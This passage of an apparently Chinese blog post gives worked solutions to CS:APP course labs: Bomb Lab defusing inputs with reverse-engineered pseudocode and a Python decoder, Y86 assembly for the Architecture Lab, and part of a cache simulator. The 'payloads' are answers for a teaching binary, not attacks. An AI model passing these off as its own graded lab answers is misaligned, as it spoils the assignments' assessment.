href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>读入六个数字,第一个为1,下一个为上一个的两倍<br>payload:’1 2 4 8 16 32’</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>读入两个数字,第一个数字不大于7.<br>实现了一张跳转表,跳到跳转表的第一个条目,检查第二个数字是否是311.<br>payload:’1 311’<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111501156.png"></p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>主要逆这个函数了,可见var2==arg1的时候拆除炸弹.<br>payload:’7 0’</p><pre class=" language-c"><code class="language-c"><span class="token function">func4</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>arg2<span class="token punctuation">,</span>arg3<span class="token punctuation">)</span><span class="token punctuation">{</span>    var1 <span class="token operator">=</span> arg3<span class="token operator">-</span>arg2<span class="token punctuation">;</span>    var2 <span class="token operator">=</span> arg2<span class="token operator">>></span><span class="token number">31</span><span class="token punctuation">;</span>    var1 <span class="token operator">+</span><span class="token operator">=</span> var2<span class="token punctuation">;</span>    var1 <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    var2 <span class="token operator">=</span> var1<span class="token operator">+</span>arg2<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>var2<span class="token operator">></span>arg1<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>var2<span class="token operator">&lt;</span>arg1<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>payload:ionefg</p><pre class=" language-c"><code class="language-c"><span class="token function">phase_5</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//a1即input_string的指针</span>    var1 <span class="token operator">=</span> a1<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">string_lenth</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">6</span><span class="token punctuation">)</span>        <span class="token function">exploade_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//将input_string中每个字符的第四位作为下标,从stringarray中取出字符,拷贝到str数组中.</span>    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>            str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> StringArray<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    str<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strings_not_equal</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token string">"flyers"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">exploade_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">}</span></code></pre><p>解密脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">phase_5</span><span class="token punctuation">(</span>goal<span class="token punctuation">)</span><span class="token punctuation">:</span>    stringarray <span class="token operator">=</span> <span class="token punctuation">[</span>ch <span class="token keyword">for</span> ch <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> goal<span class="token punctuation">:</span>        <span class="token keyword">for</span> test <span class="token keyword">in</span> stringarray<span class="token punctuation">:</span>            <span class="token keyword">if</span> ord<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>                <span class="token keyword">break</span> phase_5<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>函数较长,分成__部分逆向.<br>代码部分是仅表示逻辑的伪代码,分支和循环尽量还原源码,使用下标代替指针增减.</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121206844.png"></p><pre class=" language-c"><code class="language-c"><span class="token function">phase_6</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>    nums<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read_six_numbers</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        var1 <span class="token operator">=</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">--</span>var1<span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span>            <span class="token function">explode_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">++</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>                j <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>num<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token function">explode_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">++</span>j<span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>要注意的是,如果循环体的条件在开始时一定成立或为恒真式,汇编代码会省掉(一步)判断,这影响到对while、for等不同循环结构的判断.<br>如for(int i = 0;i!=24;),while(1);</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121500820.png"></p><pre class=" language-c"><code class="language-c"><span class="token function">phase_6</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//第一部分</span>    nums<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read_six_numbers</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        var1 <span class="token operator">=</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">--</span>var1<span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span>            <span class="token function">explode_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">++</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>                j <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>num<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token function">explode_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">++</span>j<span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//第二部分</span>    last <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">++</span>i<span class="token operator">!=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">!=</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            var2 <span class="token operator">=</span> nodes<span class="token punctuation">;</span>            <span class="token keyword">do</span><span class="token punctuation">{</span>                    var2<span class="token operator">=</span>var2<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">++</span>var3<span class="token operator">!=</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">else</span>       <span class="token punctuation">{</span>            var2 <span class="token operator">=</span>  nodes<span class="token punctuation">;</span>       <span class="token punctuation">}</span>       arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141513827.png"></p><pre class=" language-c"><code class="language-c">    i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    last <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        var2 <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-></span>next <span class="token operator">=</span> var2<span class="token punctuation">;</span>        j <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">++</span>i<span class="token operator">==</span>last<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    arr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    var3 <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>var3<span class="token operator">&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span>var3<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">explode_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var3 <span class="token operator">=</span> var3<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>整个流程:<br>第一部分读入六个数字到栈上的nums数组,检查每个数字都不大于6且各不相等.<br>(其实就是读1-6的数字排列)<br>第二部分将nums数组中每个数num = 7-num.并以此在栈上的arr指针数组中存放对应数字的结点指针.<br>第三部分根据arr指针数组的顺序重构nodes链表.最后遍历链表检查链表中值是否为递减排序.<br>递增排序nodes链表:”3 4 5 6 1 2”,故payload:”4 3 2 1 6 5”<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141525078.png"></p><h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>呃呃有一个隐藏关卡.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141553892.png"><br>发现进入条件是从0x603870读取两个数字和一个字符串,且字符串要为”DrEvil”.查看0x603870内容发现为phase_4的payload(逆一下read_line函数也能算出来),即只需该phase_4的payload为”7 0 DrEvil”即可进入.</p><p>读入一个小于1000的数字.进入fun7.<br>一个递归,观察ptr可以发现是一个二叉排序树的根节点.最后要使返回值为2.num应为22.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141656566.png"></p><pre class=" language-c"><code class="language-c"><span class="token function">fun7</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>ptr<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>ptr<span class="token operator">></span>num<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>ptr<span class="token operator">!=</span>num<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span><span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h1 id="Lab3-Attack-Lab"><a href="#Lab3-Attack-Lab" class="headerlink" title="Lab3:Attack Lab"></a>Lab3:Attack Lab</h1><p>这个就懒得做了,Linux下基本的ROP和shellcode还是比较熟的.</p><h1 id="Lab4-Architecture-Lab"><a href="#Lab4-Architecture-Lab" class="headerlink" title="Lab4:Architecture Lab"></a>Lab4:Architecture Lab</h1><p>说实话处理器这一章本来就看的云里雾里的.</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><h3 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h3><pre><code>            .pos 0            irmovq stack,%rsp            call main            halt            .align 8ele1:            .quad 0x00a            .quad ele2ele2:                   .quad 0x0b0            .quad ele3ele3:            .quad 0xc00            .quad 0main:            irmovq ele1,%rdi            call sum_list            pushq %rax            retsum_list:            xorq %rax,%rax            jmp testtest:            andq %rdi,%rdi            jne loop            retloop:            mrmovq (%rdi),%rbx            addq %rbx,%rax            mrmovq 8(%rdi),%rdi            jmp test                        .pos 0x200stack:</code></pre><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><pre><code>            .pos 0            irmovq stack,%rsp            call main            halt            .align 8ele1:            .quad 0x00a            .quad ele2ele2:            .quad 0x0b0            .quad ele3ele3:            .quad 0xc00            .quad 0main:            irmovq ele1,%rdi            call rsum_list            pushq %rax            retrsum_list:            xorq %rbx,%rbx            pushq %rbx            andq %rdi,%rdi            jne else            xorq %rax,%rax            popq %rbx            retelse:            mrmovq (%rdi),%rcx            rmmovq %rcx,(%rsp)            mrmovq 8(%rdi),%rdi            call rsum_list            mrmovq (%rsp),%rbx            addq %rbx,%rax            popq %rbx            ret            .pos 0x200stack:            </code></pre><h3 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h3><pre><code>            .pos 0            irmovq stack,%rsp            call main            halt            .align 8src:            .quad 0x00a            .quad 0x0b0            .quad 0xc00dest:                    .quad 0x111            .quad 0x222            .quad 0x333main:            irmovq $3,%rdx            irmovq src,%rdi            irmovq dest,%rsi            call copy_block            pushq %rax            retcopy_block:            xorq %rax,%rax            jmp conditioncondition:            andq %rdx,%rdx            jne loop            retloop:            irmovq $8,%r8            mrmovq (%rdi),%rcx            addq %r8,%rdi            rmmovq %rcx,(%rsi)            addq %r8,%rsi            xorq %rcx,%rax            irmovq $1,%r8            subq %r8,%rdx            jmp condition            .pos 0x200stack:</code></pre><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>根据IADDQ指令执行的六个阶段,添加一下需要用到的sig就行了.<br>挺简单的,这里就不贴出来了.</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><h3 id="iaddq"><a href="#iaddq" class="headerlink" title="iaddq"></a>iaddq</h3><p>和Part B一样添加iaddq指令</p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>先6路+3路循环展开得到CPE9.15、Score27.0</p><pre><code># You can modify this portion    # Loop header    xorq %rax,%rax# count = 0;    andq %rdx,%rdx# len &lt;= 0?    jmp test# if so, goto Done:# Loop header    andq %rdx,%rdx      # len &lt;= 0?    jmp testLoop:    mrmovq (%rdi),%r8    rmmovq %r8,(%rsi)    andq %r8,%r8    jle Loop1    iaddq $1,%raxLoop1:    mrmovq 8(%rdi),%r8    rmmovq %r8,8(%rsi)    andq %r8,%r8    jle Loop2    iaddq $1,%raxLoop2:    mrmovq 16(%rdi),%r8    rmmovq %r8,16(%rsi)    andq %r8,%r8    jle Loop3    iaddq $1,%raxLoop3:    mrmovq 24(%rdi),%r8    rmmovq %r8,24(%rsi)    andq %r8,%r8    jle Loop4    iaddq $1,%raxLoop4:    mrmovq 32(%rdi),%r8    rmmovq %r8,32(%rsi)    andq %r8,%r8    jle Loop5    iaddq $1,%raxLoop5:    mrmovq 40(%rdi),%r8    rmmovq %r8,40(%rsi)    iaddq $48,%rdi    iaddq $48,%rsi    andq %r8,%r8    jle test    iaddq $1,%rax  test:    iaddq $-6, %rdx         # 先减，判断够不够6个    jge Loop                # 6路展开    iaddq $6, %rdx    jmp test2               #剩下的L:    mrmovq (%rdi),%r8    rmmovq %r8,(%rsi)    andq %r8,%r8    jle L1    iaddq $1,%raxL1:    mrmovq 8(%rdi),%r8    rmmovq %r8,8(%rsi)    andq %r8,%r8    jle L2    iaddq $1,%raxL2:    mrmovq 16(%rdi),%r8    rmmovq %r8,16(%rsi)    iaddq $24,%rdi    iaddq $24,%rsi    andq %r8,%r8    jle test2    iaddq $1,%raxtest2:    iaddq $-3, %rdx         # 先减，判断够不够3个    jge L    iaddq $2, %rdx          # -1则不剩了，直接Done,0 剩一个, 1剩2个    je R0    jl Done    mrmovq (%rdi),%r8    rmmovq %r8,(%rsi)    andq %r8,%r8    jle R2    iaddq $1,%raxR2:    mrmovq 8(%rdi),%r8    rmmovq %r8,8(%rsi)    andq %r8,%r8    jle Done    iaddq $1,%rax    jmp DoneR0:    mrmovq (%rdi),%r8    rmmovq %r8,(%rsi)    andq %r8,%r8    jle Done    iaddq $1,%rax</code></pre><h3 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h3><p>注意到程序中的这个操作,会触发加载/使用数据冒险,导致插入一个气泡指令.<br>所以我们可以一次性复制两个数据,避免加载/使用数据冒险</p><pre><code>mrmovq (%rdi), %r8mrmovq 8(%rdi), %r9rmmovq %r8, (%rsi)rmmovq %r9, 8(%rsi)</code></pre><p>消除后得分45.4</p><h1 id="Lab5-Cache-Lab"><a href="#Lab5-Cache-Lab" class="headerlink" title="Lab5:Cache Lab"></a>Lab5:Cache Lab</h1><h2 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h2><p>模拟Cache的实现.<br>最开始的时候没有看到实验材料里的这句话,考虑复杂了…</p><blockquote><p>For this this lab, you should assume that memory accesses arealigned properly,  such that a singlememory  access  never  crosses  block  boundaries.   By  making  this  assumption,  you  can  ignore  therequest sizes in thevalgrindtraces</p></blockquote><p>大概实现了这样的数据结构,实验采取的是LRU策略,可以用链表来组织实现,我这里就用时间戳代替了.(ps:用time(NULL)获取的时间戳不够准确会造成多个行的时间戳相同,使用clock()代替或使用全局变量记录次数.)</p><blockquote><p>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182207207.png"></p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"cachelab.h"</span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;getopt.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> CacheLine<span class="token punctuation">{</span>    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> time<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> tag<span class="token punctuation">;</span><span class="token punctuation">}</span>CacheLine<span class="token punctuation">;</span>CacheLine<span class="token operator">*</span><span class="token operator">*</span> Cache <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">int</span> groupcount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> blocksize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">,</span>E<span class="token punctuation">,</span>b<span class="token punctuation">,</span>t<span class="token punctuation">;</span><span class="token keyword">char</span> verbose <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> misses <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> hits <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> evictions <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//因为不需要实际访问数据内容,所以不需要分配2^b字节的数据空间.</span><span class="token comment" spellcheck="true">//只要地址位于某Set中且标志位相同,则hit</span><span class="token keyword">void</span> <span class="token function">Cache_Init</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">,</span><span class="token keyword">int</span> E<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    groupcount <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    blocksize <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cache <span class="token operator">=</span> <span class="token punctuation">(</span>CacheLine<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>CacheLine<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>groupcount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>groupcount<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        Cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>CacheLine<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>CacheLine<span class="token punctuation">)</span><span class="token operator">*</span>E<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>E<span class="token punctuation">;</span><span class="token operator">++</span>j<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            Cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>time <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">hit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" hit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>hits<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">miss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" miss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>misses<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">eviction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token 